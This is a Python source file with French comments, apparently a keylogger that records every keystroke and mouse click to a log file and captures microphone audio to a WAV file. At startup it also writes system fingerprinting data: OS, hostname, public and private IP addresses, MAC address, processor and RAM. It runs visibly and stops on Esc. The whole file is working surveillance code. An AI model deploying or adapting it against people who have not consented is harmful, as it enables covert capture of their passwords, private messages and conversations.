from pynput import keyboard, mouse
from pynput.keyboard import Key, Listener
import logging
import platform,socket,re,uuid,json,logging,psutil
import requests
import threading
import pyaudio
import wave


LOG_FILE = "keylogfile.txt"

# Paramètres d'enregistrement audio
CHUNK = 4096  # Nombre de frames par buffer
FORMAT = pyaudio.paInt32  # Format d'encodage audio
CHANNELS = 2  # Nombre de canaux
RATE = 48000  # Fréquence d'échantillonnage (Hz)
WAVE_OUTPUT_FILENAME = "output.wav"  # Nom du fichier de sortie

# Initialiser PyAudio
audio = pyaudio.PyAudio()

# Signal the audio thread to stop
stop_audio_thread = threading.Event()


def setup_logging():
    """Set up logging."""
    logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S")


def log_system_info():
    """Set up logging and retrieve system information."""
    with open(LOG_FILE, "w") as file:
        try:
            response = requests.get('https://ipinfo.io/ip')
            Public_adress = response.text.strip()
        except requests.RequestException as e:
            file.write("Unable to get the Public IP Address\n")
        
        file.write("OS Information :\n")
        file.write(f"System: {platform.system()} {platform.version()}\n")
        file.write(f"Architecture: {platform.machine()}\n")
        file.write(f"Hostname: {socket.gethostname()}\n")
        file.write(f"Public IP Address: {Public_adress}\n")
        file.write(f"Private IP Address: {socket.gethostbyname(socket.gethostname())}\n")
        file.write(f"MAC Address: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}\n")
        file.write(f"Processor: {platform.processor()}\n")
        file.write(f"RAM: {str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB\n")
        file.write("\n")
        file.write("LOGS :\n")
        file.write("[Date Hour - 'Key' or 'Mouse Action']:\n")



def start_audio_recording():
    """Start audio recording."""
    stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)

    wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(audio.get_sample_size(FORMAT))
    wf.setframerate(RATE)

    print("Audio recording started. Press 'Esc' to stop.")
    while not stop_audio_thread.is_set():
        data = stream.read(CHUNK)
        wf.writeframes(data)

    stream.stop_stream()
    stream.close()
    audio.terminate()
    wf.close()


def on_press(key):
    """Callback for key press event."""
    logging.info(f"[Key Pressed] - {key}")


def on_release(key):
    """Callback for key release event."""
    if key == Key.esc:
        print("Stopping the script.")
        stop_audio_thread.set()
        return False

def on_click(x, y, button, pressed):
    """Callback for mouse click event."""
    if pressed:
        if button == mouse.Button.left:
            logging.info('[Mouse Click] - Left Click')
        elif button == mouse.Button.right:
            logging.info('[Mouse Click] - Right Click')
        elif button == mouse.Button.middle:
            logging.info('[Mouse Click] - Middle Click')

def main():
    """Main function to set up listeners and start logging."""
    setup_logging()
    log_system_info()

    # Start the audio recording thread
    audio_thread = threading.Thread(target=start_audio_recording)
    audio_thread.start()

    with keyboard.Listener(on_press=on_press, on_release=on_release) as key_listener, mouse.Listener(on_click=on_click) as mouse_listener:
        print("Script started. Press 'Esc' to stop.")
        key_listener.join()
        mouse_listener.stop()
        audio_thread.join()  # Wait for the audio thread to finish

if __name__ == "__main__":
    main()





